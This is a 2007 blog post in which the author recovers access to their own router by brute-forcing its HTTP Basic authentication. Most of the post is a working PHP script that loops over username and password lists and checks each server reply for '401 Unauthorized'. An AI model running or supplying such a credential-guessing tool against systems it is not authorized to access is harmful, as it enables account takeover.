@@ -1,0 +1,50 @@
+Hacking into my router by brute-forcing http authentication
+# pubdate 2007-11-28
+# pubtime 22:11:51
+# tags php
+<p>I forgot the username and password to access the web panel of my router.<br />
+Luckily I knew some possible usernames and some patterns that I could have used to construct my password, so I just had to try all the combinations... Too much work to do manually but easily done when scripted.</p>
+<p>Here is the php script that I came up with.  (obviously stripped of my personal stuff).  It got my account in less then a second :)<!--break--></p>
+<p><strong>DISCLAIMER</strong>:  Don't use this code for anything illegal!  I'm not responsible for what you do with this!</p>
+<p><code lang="php">$host = '';<br />
+$port = '';<br />
+$url = '/';<br />
+$users = array();<br />
+$passes = array();<br />
+tryme($host,$url,$port);<br />
+foreach($users as $user) {<br />
+   foreach($passes as $pass) {<br />
+      tryme($host,$url,$port,$user,$pass);<br />
+   }<br />
+}</p>
+<p>function tryme($host,$url = '/',$port = 80, $user = null,$pass =null ) {<br />
+   $result="FAIL";<br />
+   if(tryAccess($host,$url,$port, $user,$pass)) $result="SUCCESS";<br />
+   if($user &amp;& $pass) $userpass = "user $user pass $pass ";<br />
+   else $userpass = " without username &amp; password";<br />
+   echo("Tried $userpass > $result\n");<br />
+}</p>
+<p>function tryAccess($host,$url = '/',$port = 80, $user = null,$pass =null)  {<br />
+   $fp = @fsockopen ($host, $port, &amp;$errno, &amp;$errdesc);<br />
+   if (!is_resource ($fp)) {<br />
+      echo("Could't not open socket to server: $errno - $errdesc\n");<br />
+      return false;<br />
+   }<br />
+   @fputs ($fp, "POST $url HTTP/1.1\r\n");<br />
+   @fputs ($fp, "Host: $host\r\n");<br />
+   @fputs ($fp, "Connection: close\r\n");<br />
+   if($user &amp;& $pass) {<br />
+      @fputs ($fp, "Authorization: Basic " . base64_encode ("$user:$pass") . "\r\n");<br />
+   }<br />
+   @fputs($fp,"\r\n");</p>
+<p>   $reply = '';<br />
+   $success = true;<br />
+   while (!@feof ($fp)) {<br />
+      $line = @fgets ($fp, 1024);<br />
+      if(strpos($line,'401 Unauthorized')) $success = false;<br />
+      $reply .= $line;<br />
+   }<br />
+   @fclose ($fp);<br />
+   return $success;<br />
+}<br />
+</code></p>
